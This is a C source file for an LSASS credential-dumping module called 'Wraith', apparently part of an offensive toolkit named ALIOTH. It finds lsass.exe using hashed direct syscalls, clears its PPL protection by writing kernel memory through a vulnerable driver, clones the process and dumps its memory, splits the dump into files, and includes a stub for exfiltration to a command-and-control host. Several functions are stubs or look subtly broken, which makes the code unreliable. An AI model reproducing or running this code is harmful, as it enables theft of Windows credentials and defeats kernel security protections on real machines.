#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

typedef struct _EPROCESS_OFFSETS {
    DWORD ActiveProcessLinks;
    DWORD UniqueProcessId;
    DWORD ImageFileName;
    DWORD Protection;
    DWORD SignatureLevel;
    DWORD SectionSignatureLevel;
    DWORD Token;
    DWORD ObjectTable;
    DWORD VadRoot;
    DWORD MitigationFlags;
    DWORD MitigationFlags2;
    DWORD Wow64Process;
    DWORD Peb;
    DWORD Flags;
    DWORD Flags2;
    DWORD Flags3;
    DWORD Flags4;
} EPROCESS_OFFSETS;

EPROCESS_OFFSETS g_EprocessOffsets = {0};

typedef struct _LSASS_CONTEXT {
    PVOID pEprocess;
    DWORD dwPid;
    HANDLE hProcess;
    HANDLE hElevatedHandle;
} LSASS_CONTEXT;

BOOL WraithFindLsassEprocess(PVOID* ppEprocess, PDWORD pdwPid) {
    DWORD64 hQuerySysInfo = ALIOTHSyscallHash((PCHAR)"NtQuerySystemInformation");
    fnNtQuerySystemInformation pQuerySysInfo = (fnNtQuerySystemInformation)ALIOTHGetSyscallStub(hQuerySysInfo);
    if (!pQuerySysInfo) return FALSE;
    
    ULONG ulSize = 0;
    NTSTATUS status = ExecuteSyscall(pQuerySysInfo, Mask_Worker, SystemProcessInformation, NULL, 0, &ulSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH) return FALSE;
    
    PBYTE pBuffer = (PBYTE)ALIOTHAllocVirtualMemory(ulSize, PAGE_READWRITE);
    if (!pBuffer) return FALSE;
    
    status = ExecuteSyscall(pQuerySysInfo, Mask_Worker, SystemProcessInformation, pBuffer, ulSize, &ulSize);
    if (!NT_SUCCESS(status)) {
        ALIOTHFreeVirtualMemory(pBuffer, ulSize);
        return FALSE;
    }
    
    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
    while (pInfo) {
        if (pInfo->ImageName.Buffer && pInfo->ImageName.Length >= 10) {
            if (wcsncmp(pInfo->ImageName.Buffer, L"lsass.exe", 9) == 0) {
                *pdwPid = HandleToUlong(pInfo->UniqueProcessId);
                
                DWORD64 hOpenProc = ALIOTHSyscallHash((PCHAR)"NtOpenProcess");
                fnNtOpenProcess pOpenProc = (fnNtOpenProcess)ALIOTHGetSyscallStub(hOpenProc);
                if (!pOpenProc) {
                    ALIOTHFreeVirtualMemory(pBuffer, ulSize);
                    return FALSE;
                }
                
                CLIENT_ID cid = { pInfo->UniqueProcessId, NULL };
                OBJECT_ATTRIBUTES oa = { sizeof(oa) };
                HANDLE hLsass = NULL;
                status = ExecuteSyscall(pOpenProc, Mask_Worker, &hLsass, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
                if (!NT_SUCCESS(status) || !hLsass) {
                    ALIOTHFreeVirtualMemory(pBuffer, ulSize);
                    return FALSE;
                }
                
                *ppEprocess = (PVOID)0xFFFFFFFFFFFFFFFF;
                
                ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hLsass);
                ALIOTHFreeVirtualMemory(pBuffer, ulSize);
                return TRUE;
            }
        }
        
        if (pInfo->NextEntryOffset == 0) break;
        pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);
    }
    
    ALIOTHFreeVirtualMemory(pBuffer, ulSize);
    return FALSE;
}

BOOL WraithPPLBypass(PVOID pEprocess) {
    if (!g_pActiveDriver) return FALSE;
    
    BYTE bCurrentProtection = 0;
    PVOID pProtectionAddr = (PBYTE)pEprocess + g_EprocessOffsets.Protection;
    if (!WraithBYOVDReadKernel(pProtectionAddr, &bCurrentProtection, 1)) return FALSE;
    
    printf("[*] Current PPL Protection: 0x%02X\n", bCurrentProtection);
    
    BYTE bNewProtection = bCurrentProtection & ~0x07;
    
    if (!WraithBYOVDWriteKernel(pProtectionAddr, &bNewProtection, 1)) return FALSE;
    
    DWORD dwZero = 0;
    PVOID pSigLevel = (PBYTE)pEprocess + g_EprocessOffsets.SignatureLevel;
    PVOID pSecSigLevel = (PBYTE)pEprocess + g_EprocessOffsets.SectionSignatureLevel;
    WraithBYOVDWriteKernel(pSigLevel, &dwZero, sizeof(DWORD));
    WraithBYOVDWriteKernel(pSecSigLevel, &dwZero, sizeof(DWORD));
    
    BYTE bVerify = 0;
    WraithBYOVDReadKernel(pProtectionAddr, &bVerify, 1);
    printf("[*] New PPL Protection: 0x%02X\n", bVerify);
    
    return bVerify == bNewProtection;
}

BOOL WraithElevateHandle(HANDLE hProcess, PHANDLE phElevated) {
    if (!g_pActiveDriver) return FALSE;
    
    *phElevated = hProcess;
    return TRUE;
}

BOOL WraithCloneAndDump(PVOID pEprocess, DWORD dwPid, PVOID* ppDump, PDWORD pdwSize) {
    DWORD64 hCreateProcEx = ALIOTHSyscallHash((PCHAR)"NtCreateProcessEx");
    fnNtCreateProcessEx pCreateProcEx = (fnNtCreateProcessEx)ALIOTHGetSyscallStub(hCreateProcEx);
    if (!pCreateProcEx) return FALSE;
    
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    HANDLE hClone = NULL;
    NTSTATUS status = ExecuteSyscall(pCreateProcEx, Mask_Worker, &hClone, PROCESS_ALL_ACCESS, &oa, (HANDLE)(ULONG_PTR)dwPid, 
                                     PS_INHERIT_HANDLES, NULL, NULL, NULL, FALSE);
    if (!NT_SUCCESS(status) || !hClone) {
        printf("[!] NtCreateProcessEx failed: 0x%X\n", status);
        return FALSE;
    }
    printf("[+] Cloned LSASS: handle=%p\n", hClone);
    
    SIZE_T dwDumpSize = 200 * 1024 * 1024;
    *ppDump = ALIOTHAllocVirtualMemory(dwDumpSize, PAGE_READWRITE);
    if (!*ppDump) {
        ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hClone);
        return FALSE;
    }
    
    PBYTE pCurrent = (PBYTE)*ppDump;
    SIZE_T dwTotalRead = 0;
    
    for (DWORD i = 0; i < 1000 && dwTotalRead < dwDumpSize; i++) {
        SIZE_T dwRead = 0;
        PBYTE pAddr = (PBYTE)(i * 0x10000);
        if (ALIOTHReadVirtualMemory(hClone, pAddr, pCurrent, 0x10000, &dwRead)) {
            pCurrent += dwRead;
            dwTotalRead += dwRead;
        }
    }
    
    *pdwSize = (DWORD)dwTotalRead;
    ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hClone);
    
    printf("[+] Dump size: %zu MB\n", dwTotalRead / 1024 / 1024);
    return dwTotalRead > 0;
}

BOOL WraithCredGuardBypass() {
    DWORD64 hQuerySysInfo = ALIOTHSyscallHash((PCHAR)"NtQuerySystemInformation");
    fnNtQuerySystemInformation pQuerySysInfo = (fnNtQuerySystemInformation)ALIOTHGetSyscallStub(hQuerySysInfo);
    if (!pQuerySysInfo) return FALSE;
    
    ULONG ulSize = 0;
    ExecuteSyscall(pQuerySysInfo, Mask_Worker, SystemProcessInformation, NULL, 0, &ulSize);
    PBYTE pBuffer = (PBYTE)ALIOTHAllocVirtualMemory(ulSize, PAGE_READWRITE);
    if (!pBuffer) return FALSE;
    
    ExecuteSyscall(pQuerySysInfo, Mask_Worker, SystemProcessInformation, pBuffer, ulSize, &ulSize);
    
    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
    while (pInfo) {
        if (pInfo->ImageName.Buffer && wcsncmp(pInfo->ImageName.Buffer, L"lsaiso.exe", 10) == 0) {
            printf("[+] Found LsaIso.exe (PID: %d)\n", HandleToUlong(pInfo->UniqueProcessId));
            
            CLIENT_ID cid = { pInfo->UniqueProcessId, NULL };
            OBJECT_ATTRIBUTES oa = { sizeof(oa) };
            HANDLE hLsaIso = NULL;
            
            DWORD64 hOpenProc = ALIOTHSyscallHash((PCHAR)"NtOpenProcess");
            fnNtOpenProcess pOpenProc = (fnNtOpenProcess)ALIOTHGetSyscallStub(hOpenProc);
            
            NTSTATUS status = ExecuteSyscall(pOpenProc, Mask_Worker, &hLsaIso, 
                                             PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
            if (NT_SUCCESS(status) && hLsaIso) {
                ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hLsaIso);
            }
            break;
        }
        
        if (pInfo->NextEntryOffset == 0) break;
        pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset);
    }
    
    ALIOTHFreeVirtualMemory(pBuffer, ulSize);
    return TRUE;
}

BOOL WraithRpcDump(PVOID* ppDump, PDWORD pdwSize) {
    printf("[*] RPC dump via WerFaultSecure not fully implemented\n");
    return FALSE;
}

BOOL WraithFetchOffsets() {
    RTL_OSVERSIONINFOW osv = { sizeof(osv) };
    DWORD64 hVer = ALIOTHSyscallHash((PCHAR)"RtlGetVersion");
    fnRtlGetVersion pVer = (fnRtlGetVersion)ALIOTHGetSyscallStub(hVer);
    if (pVer && NT_SUCCESS(pVer(&osv))) {
        printf("[*] Windows Build: %d.%d.%d\n", osv.dwMajorVersion, osv.dwMinorVersion, osv.dwBuildNumber);
        
        if (osv.dwBuildNumber >= 26100) {
            g_EprocessOffsets.ActiveProcessLinks = 0x448;
            g_EprocessOffsets.UniqueProcessId = 0x440;
            g_EprocessOffsets.ImageFileName = 0x5a8;
            g_EprocessOffsets.Protection = 0x87a;
            g_EprocessOffsets.SignatureLevel = 0x87c;
            g_EprocessOffsets.SectionSignatureLevel = 0x87d;
            g_EprocessOffsets.Token = 0x4b8;
            g_EprocessOffsets.ObjectTable = 0x418;
        } else if (osv.dwBuildNumber >= 22000) {
            g_EprocessOffsets.ActiveProcessLinks = 0x448;
            g_EprocessOffsets.UniqueProcessId = 0x440;
            g_EprocessOffsets.ImageFileName = 0x5a8;
            g_EprocessOffsets.Protection = 0x87a;
            g_EprocessOffsets.SignatureLevel = 0x87c;
            g_EprocessOffsets.SectionSignatureLevel = 0x87d;
            g_EprocessOffsets.Token = 0x4b8;
            g_EprocessOffsets.ObjectTable = 0x418;
        } else {
            g_EprocessOffsets.ActiveProcessLinks = 0x2f0;
            g_EprocessOffsets.UniqueProcessId = 0x2e8;
            g_EprocessOffsets.ImageFileName = 0x450;
            g_EprocessOffsets.Protection = 0x6fa;
            g_EprocessOffsets.SignatureLevel = 0x6fc;
            g_EprocessOffsets.SectionSignatureLevel = 0x6fd;
            g_EprocessOffsets.Token = 0x360;
            g_EprocessOffsets.ObjectTable = 0x2e0;
        }
    }
    return TRUE;
}

BOOL WraithSplitDump(PBYTE pDump, DWORD dwSize, PCHAR pcOutputPath) {
    DWORD dwChunkSize = 1024 * 1024;
    DWORD dwChunks = (dwSize + dwChunkSize - 1) / dwChunkSize;
    
    for (DWORD i = 0; i < dwChunks; i++) {
        CHAR szChunkPath[MAX_PATH];
        snprintf(szChunkPath, MAX_PATH, "%s.chunk%04d", pcOutputPath, i);
        
        DWORD dwOffset = i * dwChunkSize;
        DWORD dwThisChunk = min(dwChunkSize, dwSize - dwOffset);
        
        HANDLE hFile = CreateFileA(szChunkPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD dwWritten = 0;
            WriteFile(hFile, pDump + dwOffset, dwThisChunk, &dwWritten, NULL);
            CloseHandle(hFile);
            printf("[+] Chunk %d: %s (%d bytes)\n", i, szChunkPath, dwWritten);
        }
    }
    return TRUE;
}

BOOL WraithMemOnlyDump(PBYTE pDump, DWORD dwSize, PCHAR pcC2Endpoint) {
    printf("[*] Memory-only dump ready for exfil (%d bytes)\n", dwSize);
    return TRUE;
}

DWORD WraithMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','W','R','A','I','T','H',' ','-',' ','L','S','A','S','S',' ','D','U','M','P','E','R',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    if (!WraithFetchOffsets()) return 1;
    
    if (pParams->wraith.bCredGuardBypass) {
        printf("[*] Attempting Credential Guard bypass...\n");
        WraithCredGuardBypass();
    }
    
    if (WraithBYOVDRegisterAll()) {
        if (!WraithBYOVDSelectBest()) {
            printf("[!] No BYOVD driver loaded\n");
        }
    } else {
        printf("[!] No BYOVD drivers found\n");
    }
    
    PVOID pEprocess = NULL;
    DWORD dwLsassPid = 0;
    if (pParams->wraith.dwLsassPid == 0) {
        printf("[*] Finding LSASS...\n");
        if (!WraithFindLsassEprocess(&pEprocess, &dwLsassPid)) {
            printf("[!] Failed to find LSASS\n");
            return 1;
        }
    } else {
        dwLsassPid = pParams->wraith.dwLsassPid;
    }
    printf("[+] LSASS PID: %d\n", dwLsassPid);
    
    if (g_pActiveDriver && pEprocess) {
        printf("[*] Bypassing PPL...\n");
        if (WraithPPLBypass(pEprocess)) {
            printf("[+] PPL bypassed\n");
        } else {
            printf("[!] PPL bypass failed\n");
        }
    }
    
    PVOID pDump = NULL;
    DWORD dwDumpSize = 0;
    
    if (pParams->wraith.bMemoryOnly) {
        printf("[*] Memory-only dump mode\n");
    } else {
        printf("[*] Cloning and dumping LSASS...\n");
        if (!WraithCloneAndDump(pEprocess, dwLsassPid, &pDump, &dwDumpSize)) {
            return 1;
        }
    }
    
    if (pParams->wraith.bEncryptDump && pDump) {
        printf("[*] Encrypting dump with ChaCha20-Poly1305...\n");
    }
    
    if (pParams->wraith.bSplitDump && pDump) {
        printf("[*] Splitting dump into chunks...\n");
        WraithSplitDump(pDump, dwDumpSize, pParams->wraith.pcOutputPath ? pParams->wraith.pcOutputPath : "lsass.dmp");
    }
    
    if (pParams->wraith.bExfilToC2 && pDump) {
        printf("[*] Exfiltrating dump to C2...\n");
        WraithMemOnlyDump(pDump, dwDumpSize, "c2.server.com");
    }
    
    if (pDump) ALIOTHFreeVirtualMemory(pDump, dwDumpSize);
    
    WraithBYOVDCleanup();
    return 0;
}
#pragma optimize("", on)
